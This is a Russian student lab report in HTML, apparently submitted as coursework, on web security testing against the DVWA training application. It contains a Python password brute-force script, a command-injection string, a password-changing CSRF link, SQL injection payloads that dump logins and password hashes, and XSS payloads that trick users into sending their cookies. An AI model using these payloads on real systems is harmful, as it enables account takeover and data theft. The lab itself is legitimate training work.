@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Практическая работа</title>
+	<meta charset="utf-8">
+	<link rel="stylesheet" type="text/css" href="static/test.css">
+</head>
+<body>
+	<main>
+		<div class="title_page">
+			<p>
+				ДЕПАРТАМЕНТ ПРОФЕССИОНАЛЬНОГО ОБРАЗОВАНИЯ<br/>
+				ТОМСКОЙ ОБЛАСТИ<br/>
+				ОБЛАСТНОЕ ГОСУДАРСТВЕННОЕ БЮДЖЕТНОЕ ПРОФЕССИОНАЛЬНОЕ ОБРАЗОВАТЕЛЬНОЕ
+				УЧРЕЖДЕНИЕ<br/>
+				«ТОМСКИЙ ТЕХНИКУМ ИНФОРМАЦИОННЫХ ТЕХНОЛОГИЙ»
+			</p>
+
+			<p class="discipline">Специальность 090207 «Информационные системы и программирование»</p>
+
+			<p class="title_work">
+				Тестирование безопасности
+			</p>
+
+			<div class="signature">
+				<table>
+					<tr>
+						<td>Студент<br/>«__»________ 2021 г.</td>
+						<td>_________________</td>
+						<td>Кулманаков И.В.</td>
+					</tr>
+					<tr>
+						<td>Руководитель<br/>«__»________ 2021 г.</td>
+						<td>_________________</td>
+						<td>Пермяков В.В.</td>
+					</tr>
+				</table>
+			</div>
+
+			<p>Томск 2021</p><div></div>
+		</div>
+
+		<div>
+			<h2>Введение</h2>
+
+			<h3>Цель</h3>
+			<p>
+				Научиться основным способам тестирования веб-приложений
+			</p>
+		</div>
+		
+		<div>
+			<h2>Ход работы</h2>
+
+			<h3>Установка DVWA</h3>
+			<p>
+				<div class="img">
+					<img src="img/1.png">
+					<p>Установленное DVWA</p>
+				</div>
+			</p>
+
+			<h3>Brute Force</h3>
+			<p>
+				<div class="img">
+					<img src="img/2.1.png">
+					<p>Страница /vulnerabilities/brute/</p>
+				</div>
+				<div>
+					<pre>
+import mechanize
+
+br = mechanize.Browser()
+br.set_handle_equiv(True)
+br.set_handle_redirect(True)
+br.set_handle_referer(True)
+br.set_handle_robots(False)
+
+# combos = open('common-passwords.txt', 'r')
+
+with open('common-passwords.txt') as f:
+    combos = f.readlines()
+br.open("http://192.168.14.204/login.php")
+for x in combos:
+    password = ''.join(x[0:-1])
+    br.select_form(nr=0)
+    br.form['username'] = "admin"
+    br.form['password'] = password
+    # br.form['password'] = 'password'
+    print("Checking ", br.form['password'])
+    response=br.submit()
+    # print(response.geturl())
+    if response.geturl() == "http://192.168.14.204/index.php":
+        # url to which the page is redirected after login
+        print("Correct password is ", password)
+        break
+</pre>
+					<p>Скрипт Brute Force на python</p>
+				</div>
+			</p>
+
+			<h3>Command Injection</h3>
+			<p>
+				<div class="img">
+					<img src="img/3.1.png">
+					<p>Окно для ввода</p>
+				</div>
+			</p>
+			<p>
+				<div>
+					<pre>127.0.0.1; echo "--------> Haked! <--------"</pre>
+					<p>Введённая строка</p>
+				</div>
+			</p>
+			<p>
+				<div class="img">
+					<img src="img/3.2.png">
+					<p>Взломанный сайт</p>
+				</div>
+			</p>
+
+			<h3>CSRF</h3>
+			<p>
+				<div class="img">
+					<img src="img/4.1.png">
+					<p>Окно для ввода</p>
+				</div>
+				<p>
+					<a href="http://192.168.14.206:8080/vulnerabilities/csrf/?password_new=hackAll&password_conf=hackAll&Change=Change">
+					Ссылка не для смены пароля в выгоду злоумышлинникам.
+					</a>
+				</p>
+				<div class="img">
+					<img src="img/4.2.png">
+					<p>После перехода по ссылке</p>
+				</div>
+				<p>
+					После перехода по ссылке меняется пароль. Если бы автору ссылки было не лень
+					написать хорошую плохую ссылку, то можно было бы ещё и скрыть данный факт или выйти из системы.
+				</p>
+			</p>
+
+			<h3>File Inclusion</h3>
+			<div class="img">
+				<img src="img/5.1.png">
+				<p>Не взломано</p>
+			</div>
+			<p>
+				Взлом произошёл путём исправления пути к файлу в адресной строке.
+			</p>
+			<div class="img">
+				<img src="img/5.2.png">
+				<p>Взломано</p>
+			</div>
+
+			<h3>File Upload</h3>
+			<div class="img">
+				<img src="img/6.1.png">
+				<p>Не взломано</p>
+			</div>
+			<div class="img">
+				<img src="img/6.2.png">
+				<p>Почти взломано</p>
+			</div>
+			<p>
+				Взлом произошёл путём отправления вредоносного файла на сервер
+			</p>
+			<div class="img">
+				<img src="img/6.3.png">
+				<p>Взломано</p>
+			</div>
+
+			<h3>SQL Injection</h3>
+			<div class="img">
+				<img src="img/7.1.png">
+				<p>Не взломано</p>
+			</div>
+			<p>
+				Взлом произошёл путём доставания недоставаемой информации.
+				Информация доставалась при помощи следующего ввода:
+				<pre>1' UNION SELECT user, password FROM users WHERE user_id != '-1</pre>
+			</p>
+			<div class="img">
+				<img src="img/7.2.png">
+				<p>Взломано</p>
+			</div>
+			<p>
+				При помощи данной атаки были получены все логины и хешированные
+				пароли.
+			</p>
+
+			<h3>SQL Injection (Blind)</h3>
+			<p>
+				Взлом произошёл путём доставания недоставаемой информации.
+				Можно осуществить проверку на наличие пользователя "admin2".
+				Информация доставалась при помощи следующего ввода:
+				<pre>-1' or (select count(*) from users where user = "admin2") and 1='1</pre>
+			</p>
+			<div class="img">
+				<img src="img/8.1.png">
+				<p>Пользователь "admin2" отсутствует</p>
+			</div>
+			<p>
+				Проверка пользователя "admin":
+				<pre>-1' or (select count(*) from users where user = "admin") and 1='1</pre>
+			</p>
+			<div class="img">
+				<img src="img/8.2.png">
+				<p>Пользователь "admin" присутствует</p>
+			</div>
+
+			<h3>DOM Based Cross Site Scripting (XSS)</h3>
+			<div class="img">
+				<img src="img/10.1.png">
+				<p>Просто страница с генератором печенья</p>
+			</div>
+			<p>
+				Доставание печенек пользователя:<br>
+				<a href="http://192.168.14.206/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(%22%D0%AF%20%D0%B2%D0%B0%D1%88%20%D1%81%D0%B8%D1%81%D0%B0%D0%B4%D0%BC%D0%B8%D0%BD.%20%D0%9F%D0%BE%D0%B6%D0%B0%D0%BB%D1%83%D0%B9%D1%81%D1%82%D0%B0,%20%D0%BE%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D1%82%D0%B5%20%D0%BD%D0%B0%20%D1%8D%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D0%BD%D0%BD%D1%83%D1%8E%20%D0%BF%D0%BE%D1%87%D1%82%D1%83%20exemple@exemple.exe%20%D1%81%D0%BB%D0%B5%D0%B4%D1%83%D1%8E%D1%89%D1%83%D1%8E%20%D1%81%D1%82%D1%80%D0%BE%D0%BA%D1%83:\n%22+document.cookie+%22\n%D0%91%D0%BB%D0%B0%D0%B3%D0%BE%D0%B4%D0%B0%D1%80%D0%B8%D0%BC%20%D0%B7%D0%B0%20%D1%81%D0%BE%D1%82%D1%80%D1%83%D0%B4%D0%BD%D0%B8%D1%87%D0%B5%D1%81%D1%82%D0%B2%D0%BE.%22)%3C/script%3E">Просто ссылочка.</a><br>
+				Текст ссылки, только по-человечески (дополнительно вставлены переносы строк и табуляция для удобного чтения):
+				<pre>
+http://192.168.14.206/vulnerabilities/xss_d/?default=English
+&lt;script&gt;
+	alert(&#x60;Здравствуйте, я ваш сисадмин.
+		Пожалуйста, отправте на электронную почту
+		exemple@exemple.exe следующую строку:\n&#x60;
+		+document.cookie+
+		&#x60;\nБлагодарим за сотрудничество.&#x60;);
+&lt;/script&gt;
+				</pre>
+			</p>
+			<div class="img">
+				<img src="img/10.2.png">
+				<p>Успешное убеждение пользователя</p>
+			</div>
+
+			<h3>Reflected Cross Site Scripting</h3>
+			<div class="img">
+				<img src="img/10.1.png">
+				<p>Просто страница с генератором печенья</p>
+			</div>
+			<p>
+				Доставание печенек пользователя:<br>
+				<a href="">Просто ссылочка.</a><br>
+				Текст ссылки, только по-человечески (дополнительно вставлены переносы строк и табуляция для удобного чтения):
+				<pre>
+http://192.168.14.206/vulnerabilities/xss_d/?name=name
+&lt;script&gt;
+	alert(&#x60;Здравствуйте, я ваш сисадмин.
+		Пожалуйста, отправте на электронную почту
+		exemple@exemple.exe следующую строку:\n&#x60;
+		+document.cookie+
+		&#x60;\nБлагодарим за сотрудничество.&#x60;);
+&lt;/script&gt;
+				</pre>
+			</p>
+			<div class="img">
+				<img src="img/10.2.png">
+				<p>Успешное убеждение пользователя</p>
+			</div>
+		</div>
+
+		<div>
+			<h2>Вывод</h2>
+			<p>
+				В ходе выполнения практической работы были получены практические
+				навыки работы с удалённой виртуальной машиной, а также получены
+				знания о основных способах тестирования веб-приложений.
+			</p>
+		</div>
+	</main>
+</body>
+</html>
